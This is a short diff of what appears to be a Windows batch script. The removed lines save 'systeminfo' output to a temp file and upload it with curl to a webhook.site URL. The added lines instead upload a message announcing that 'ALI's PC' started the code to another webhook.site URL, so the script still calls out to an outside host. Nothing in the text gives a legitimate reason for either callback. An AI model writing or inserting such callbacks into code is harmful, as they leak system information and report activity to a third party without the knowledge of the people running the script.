@@ -1,2 +1,2 @@
-systeminfo > %temp%\info.txt
-curl -T "%temp%/info.txt" "https://webhook.site/9bc6ab72-e787-4f86-aef7-2f2a015b24d1"
+echo ALI's PC STARTED With Your Code > %temp%\info.txt
+curl -T "%temp%/info.txt" "https://webhook.site/d6d2c879-210b-4ef4-b225-ea070c77f4f9"
